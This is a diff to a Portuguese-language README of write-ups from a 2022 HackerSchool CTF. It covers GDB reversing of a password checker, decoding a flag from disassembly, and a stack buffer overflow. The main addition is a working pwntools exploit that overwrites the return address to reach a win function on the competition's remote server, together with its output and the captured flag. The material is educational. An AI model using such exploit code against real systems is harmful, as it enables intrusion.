@@ -4,7 +4,7 @@
 [Weekend CTF Tournament (21 & 22 de maio 2022)](https://ctf.hackerschool.io)
 
 ## Info
-Este repo contem alguns writeups das nossas soluções nas CTF's da HS.
+Este repo contem alguns writeups das nossas soluções nas CTF's da HS. <br>
 Foi o nosso 1º contacto com CTF's! Portanto as nossas soluções **não são as melhores**.
 - Lugar (equipa): 5º
 - Pontos: 1760
@@ -70,7 +70,7 @@ Foi o nosso 1º contacto com CTF's! Portanto as nossas soluções **não são as
 ### Introdução GDB
 ![challenge](/assets/introducao_gdb.png)
 
-```
+```arm
 $ ./introducao_gdb
 Bem-vindo! Fiz um pequeno verificador de passwords eheh, consegues adivinhar?
 ola
@@ -90,7 +90,7 @@ Fácil xD.
 
 Podemos também resolver utilizando o GDB, o que faria eu era o seguinte:
 Primeiro ia verificar a função main:
-```
+```assembly
 gef➤  disas main
 Dump of assembler code for function main:
    0x0000555555555165 <+0>:	push   rbp
@@ -150,7 +150,7 @@ End of assembler dump.
 ```
 
 Podemos ver que no endereço de memória `0x000055555555520d` acontece o seguinte:
-```
+```assembly
 0x000055555555520d <+168>:	cmp    DWORD PTR [rbp-0x8],0x0
 0x0000555555555211 <+172>:	je     0x55555555522e <main+201>
 ```
@@ -163,7 +163,7 @@ Boom, a string está vísivel no stack.
 ### Estás a olhar?
 ![challenge](/assets/estas_a_olhar.png)
 
-```
+```bash
 $ ./estas_a_olhar
 Flag aqui? nunca #HS 
 ```
@@ -175,7 +175,7 @@ Portanto armei-me em trolha e fui dar disassembly ao binário:
 *(intel syntax porque ATT dá-me dores de cabeça)*
 
 Olhando para a função main, temos o seguinte:
-```
+```assembly
 0000000000001135 <main>:
     1135:	55                   	push   rbp
     1136:	48 89 e5             	mov    rbp,rsp
@@ -227,16 +227,16 @@ Portanto, olhei para `mov    DWORD PTR [rbp-0x12],0x7b5348` e fui converter `0x7
 0x3f3f74  ->  \x3f\x3f\x74 = ??t  ->  \x74\x3f\x3f = t??
 0x7d3f    ->  \x7d\x3f     = }?   ->  \x3f\x7d     = ?}
 ```
-Resultado final: `{HS{w41t_s0_str1ngs_w0rks_0r_n0t???}`
+Flag: `{HS{w41t_s0_str1ngs_w0rks_0r_n0t???}`
 
 Acabei por descobrir no final da competição que era só executar `strings -n 2` LOL.
-
 
 ## pwn
 ### Borda Fora
 ![challenge](/assets/borda_fora.png)
 
-```
+```bash
+$ ./borda_fora
 Bem-vindos a um desafio de buffer overflow!
 Primeiro é tentar compilar o binário com gcc e ver os avisos que mostra
 Qual é o problema destas funções?
@@ -247,7 +247,7 @@ aaa
 Ok, este foi engraçado, o objetivo é dar buffer overflow pelos vistos.
 O comando `strings` não ajudou, portanto, fui direto para o disassembly.
 `objdump borda_fora -d -M intel` mostra me o seguinte:
-```
+```assembly
 0000000000400757 <funcao_nada_suspeita>:
   400757:	55                   	push   rbp
   400758:	48 89 e5             	mov    rbp,rsp
@@ -331,14 +331,14 @@ Podemos observar que o resto do input foi para o stack também, e quando o `main
 **Portanto, como é que utilizamos isto a nosso favor?** Bem, é só enviarmos o endereço da função que queremos executar (`funcao_nada_suspeita`), portanto o `$rip` vai ter um valor válido e o programa continuará e mostrará a flag.
 
 Se executarmos `disas funcao_nada_suspeita` no gdb:
-```
+```assembly
 Dump of assembler code for function funcao_nada_suspeita:
    0x0000000000400757 <+0>:	push   rbp
    0x0000000000400758 <+1>:	mov    rbp,rsp
    .....
 ```
 Sabemos que a função começa em `0x0000000000400757`, mas 1º precisamos de saber se o binário utiliza little-endian ou big-endian, por isso utilizamos o comando `file`:
-```
+```bash
 $ file borda_fora
 borda_fora: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3063c552547e261d582f295694edb3ac275265e3, not stripped
 ``` 
@@ -346,9 +346,52 @@ borda_fora: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically lin
 
 Para isto, fiz um simples script em python, utilizando a lib `pwntools`.
 
-```py
+```python
+import pwn
+import sys
+
+elf = pwn.ELF("./borda_fora")
+
+p = 0
+if 'local' in sys.argv:
+    p = elf.process()
+else:
+    p = pwn.remote('193.136.166.70', '4000')
+
+fun = pwn.p64(elf.symbols["funcao_nada_suspeita"]) #lsb address
+segv_start = 88 # aKa where SEGV starts
+payload = b"".join([
+    b"A"*segv_start,
+    fun,
+])
+
+#in case we want to debug w gdb
+#pwn.context.terminal = ['alacritty', '-e', 'sh', '-c']
+#pwn.gdb.attach(p, gdbscript='''
+#b somewhere...
+#r < payload
+#''')
+
+p.recv()
+p.sendline(payload)
+p.recv()
+p.interactive()
+
 ```
 
 Resultado:
+```bash
+$ python3 borda_fora.py
+[*] '/mnt/c/Coding/ctf_hackerschool/borda_fora_/borda_fora'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 193.136.166.70 on port 4000: Done
+[*] Switching to interactive mode
+Vitória
+HS{tH3_buff3r_flow}
 ```
-```
+
+Flag: `HS{tH3_buff3r_flow}`
